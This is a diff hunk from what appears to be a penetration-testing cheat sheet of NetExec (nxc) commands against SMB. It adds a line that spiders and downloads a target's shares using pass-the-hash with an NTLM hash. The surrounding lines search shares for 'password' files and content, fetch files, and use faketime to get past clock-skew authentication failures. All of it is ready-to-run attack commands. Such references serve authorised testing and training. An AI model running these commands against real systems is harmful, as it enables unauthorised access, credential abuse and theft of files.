@@ -1584,6 +1584,7 @@ nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --tasklist                      
 nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --spider C$ --spider-folder Users --pattern password       # search share names
 nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --spider C$ --regex ".*\\.txt$" --content                  # regex and content search
 nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=true                       # recursive SMB spidering and download discovered files
+nxc smb <RHOST> -d <DOMAIN> -u '<USERNAME>' -H '<NTLM_HASH>' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=. MAX_FILE_SIZE=<BYTES>    # spider/download SMB files with pass-the-hash; raise max file size for large downloads
 # Use faketime when local clock skew breaks auth; DOWNLOAD_FLAG saves discovered files and OUTPUT_FOLDER=. writes them under the current directory.
 faketime 'now + <HOURS> hours' netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.    # recursive SMB spidering with downloads
 nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file "\\Windows\\Temp\\file.txt" ./file.txt          # download file
